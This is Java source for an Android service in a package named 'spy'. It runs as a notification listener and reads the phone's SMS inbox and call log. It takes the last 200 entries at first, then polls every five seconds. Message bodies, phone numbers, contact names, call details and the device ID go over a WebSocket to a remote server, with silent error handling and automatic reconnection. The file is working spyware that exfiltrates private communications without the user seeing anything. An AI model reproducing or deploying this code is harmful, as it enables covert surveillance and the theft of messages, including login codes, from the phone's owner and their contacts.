package com.voyre.spy;

import android.app.Notification;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class NotificationHandler extends NotificationListenerService {
    private WebSocket webSocket;
    private Handler handler;
    private boolean isConnected = false;
    private String deviceId;
    private String username;
    private int reconnectAttempts = 0;
    private PackageManager packageManager;
    private long lastSmsTime = 0;
    private long lastCallTime = 0;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        handler = new Handler(Looper.getMainLooper());
        
        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            deviceId = "unknown_" + System.currentTimeMillis();
        }
        
        username = Config.getUsername(this);
        packageManager = getPackageManager();
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                connectWebSocket();
            }
        }, 1000);
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkNewSms();
            }
        }, 5000);
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkNewCalls();
            }
        }, 5000);
    }
    
    private void connectWebSocket() {
        try {
            OkHttpClient client = new OkHttpClient.Builder()
                .pingInterval(5, TimeUnit.SECONDS)
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .build();
            
            Request request = new Request.Builder()
                .url(Config.WS_URL)
                .build();
            
            webSocket = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    isConnected = true;
                    reconnectAttempts = 0;
                    sendAuth();
                    sendInitialSms();
                    sendInitialCalls();
                }
                
                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    try {
                        JSONObject msg = new JSONObject(text);
                        if (msg.has("type") && "ping".equals(msg.getString("type"))) {
                            JSONObject pong = new JSONObject();
                            pong.put("type", "pong");
                            webSocket.send(pong.toString());
                        }
                    } catch (Exception e) {}
                }
                
                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    isConnected = false;
                    reconnect();
                }
                
                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    isConnected = false;
                    reconnect();
                }
            });
        } catch (Exception e) {
            reconnect();
        }
    }
    
    private void sendAuth() {
        try {
            JSONObject auth = new JSONObject();
            auth.put("type", "auth");
            auth.put("username", username != null ? username : "default");
            auth.put("device_id", deviceId != null ? deviceId : "unknown");
            auth.put("model", "SMS/Call Monitor");
            auth.put("battery", 0);
            if (webSocket != null && isConnected) {
                webSocket.send(auth.toString());
            }
        } catch (Exception e) {}
    }
    
    private void sendInitialSms() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            Uri smsUri = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(smsUri, null, null, null, "date DESC LIMIT 200");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                        String type = cursor.getString(cursor.getColumnIndexOrThrow("type"));
                        
                        if (address == null) address = "unknown";
                        if (body == null) body = "";
                        
                        if (date > lastSmsTime) {
                            lastSmsTime = date;
                        }
                        
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));
                        
                        JSONObject smsData = new JSONObject();
                        smsData.put("type", "notification");
                        smsData.put("app", "SMS");
                        smsData.put("package", "com.android.mms");
                        smsData.put("title", "SMS from: " + address);
                        smsData.put("content", body);
                        smsData.put("time", date);
                        smsData.put("time_formatted", formattedDate);
                        smsData.put("sms_type", type.equals("1") ? "inbox" : "sent");
                        smsData.put("address", address);
                        smsData.put("history", true);
                        
                        if (webSocket != null && isConnected) {
                            webSocket.send(smsData.toString());
                        }
                        
                    } catch (Exception e) {}
                    
                } while (cursor.moveToNext());
                cursor.close();
            }
            
        } catch (SecurityException e) {} catch (Exception e) {}
    }
    
    private void sendInitialCalls() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            Uri callsUri = CallLog.Calls.CONTENT_URI;
            Cursor cursor = getContentResolver().query(callsUri, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        
                        if (number == null) number = "unknown";
                        if (name == null) name = "unknown";
                        if (duration == null) duration = "0";
                        
                        if (date > lastCallTime) {
                            lastCallTime = date;
                        }
                        
                        String callType = "";
                        switch (type) {
                            case CallLog.Calls.INCOMING_TYPE:
                                callType = "incoming";
                                break;
                            case CallLog.Calls.OUTGOING_TYPE:
                                callType = "outgoing";
                                break;
                            case CallLog.Calls.MISSED_TYPE:
                                callType = "missed";
                                break;
                            case CallLog.Calls.REJECTED_TYPE:
                                callType = "rejected";
                                break;
                            case CallLog.Calls.BLOCKED_TYPE:
                                callType = "blocked";
                                break;
                            default:
                                callType = "unknown";
                        }
                        
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));
                        
                        JSONObject callData = new JSONObject();
                        callData.put("type", "notification");
                        callData.put("app", "Phone");
                        callData.put("package", "com.android.dialer");
                        callData.put("title", "Call: " + callType + " from " + (name.equals("unknown") ? number : name));
                        callData.put("content", "Number: " + number + "\nName: " + name + "\nDuration: " + duration + "s\nType: " + callType);
                        callData.put("time", date);
                        callData.put("time_formatted", formattedDate);
                        callData.put("call_number", number);
                        callData.put("call_name", name);
                        callData.put("call_duration", duration);
                        callData.put("call_type", callType);
                        callData.put("history", true);
                        
                        if (webSocket != null && isConnected) {
                            webSocket.send(callData.toString());
                        }
                        
                    } catch (Exception e) {}
                    
                } while (cursor.moveToNext());
                cursor.close();
            }
            
        } catch (SecurityException e) {} catch (Exception e) {}
    }
    
    private void checkNewSms() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        checkNewSms();
                    }
                }, 10000);
                return;
            }
            
            Uri smsUri = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(smsUri, null, "date > " + lastSmsTime, null, "date ASC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                        String type = cursor.getString(cursor.getColumnIndexOrThrow("type"));
                        
                        if (address == null) address = "unknown";
                        if (body == null) body = "";
                        
                        lastSmsTime = date;
                        
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));
                        
                        JSONObject smsData = new JSONObject();
                        smsData.put("type", "notification");
                        smsData.put("app", "SMS");
                        smsData.put("package", "com.android.mms");
                        smsData.put("title", "New SMS from: " + address);
                        smsData.put("content", body);
                        smsData.put("time", date);
                        smsData.put("time_formatted", formattedDate);
                        smsData.put("sms_type", type.equals("1") ? "inbox" : "sent");
                        smsData.put("address", address);
                        
                        if (webSocket != null && isConnected) {
                            webSocket.send(smsData.toString());
                        }
                        
                    } catch (Exception e) {}
                    
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    checkNewSms();
                }
            }, 5000);
            
        } catch (SecurityException e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    checkNewSms();
                }
            }, 10000);
        } catch (Exception e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    checkNewSms();
                }
            }, 5000);
        }
    }
    
    private void checkNewCalls() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        checkNewCalls();
                    }
                }, 10000);
                return;
            }
            
            Uri callsUri = CallLog.Calls.CONTENT_URI;
            Cursor cursor = getContentResolver().query(callsUri, null, CallLog.Calls.DATE + " > " + lastCallTime, null, CallLog.Calls.DATE + " ASC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        
                        if (number == null) number = "unknown";
                        if (name == null) name = "unknown";
                        if (duration == null) duration = "0";
                        
                        lastCallTime = date;
                        
                        String callType = "";
                        switch (type) {
                            case CallLog.Calls.INCOMING_TYPE:
                                callType = "incoming";
                                break;
                            case CallLog.Calls.OUTGOING_TYPE:
                                callType = "outgoing";
                                break;
                            case CallLog.Calls.MISSED_TYPE:
                                callType = "missed";
                                break;
                            case CallLog.Calls.REJECTED_TYPE:
                                callType = "rejected";
                                break;
                            case CallLog.Calls.BLOCKED_TYPE:
                                callType = "blocked";
                                break;
                            default:
                                callType = "unknown";
                        }
                        
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));
                        
                        JSONObject callData = new JSONObject();
                        callData.put("type", "notification");
                        callData.put("app", "Phone");
                        callData.put("package", "com.android.dialer");
                        callData.put("title", "New Call: " + callType + " from " + (name.equals("unknown") ? number : name));
                        callData.put("content", "Number: " + number + "\nName: " + name + "\nDuration: " + duration + "s\nType: " + callType);
                        callData.put("time", date);
                        callData.put("time_formatted", formattedDate);
                        callData.put("call_number", number);
                        callData.put("call_name", name);
                        callData.put("call_duration", duration);
                        callData.put("call_type", callType);
                        
                        if (webSocket != null && isConnected) {
                            webSocket.send(callData.toString());
                        }
                        
                    } catch (Exception e) {}
                    
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    checkNewCalls();
                }
            }, 5000);
            
        } catch (SecurityException e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    checkNewCalls();
                }
            }, 10000);
        } catch (Exception e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    checkNewCalls();
                }
            }, 5000);
        }
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Tidak melakukan apa-apa karena hanya fokus pada SMS dan Call Logs
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
    
    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
    }
    
    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        reconnect();
    }
    
    private void reconnect() {
        reconnectAttempts++;
        long delay = Math.min(5000 * reconnectAttempts, 30000);
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                connectWebSocket();
            }
        }, delay);
    }
    
    @Override
    public void onDestroy() {
        if (webSocket != null) {
            try {
                webSocket.close(1000, "Service destroyed");
            } catch (Exception e) {}
        }
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        super.onDestroy();
    }
}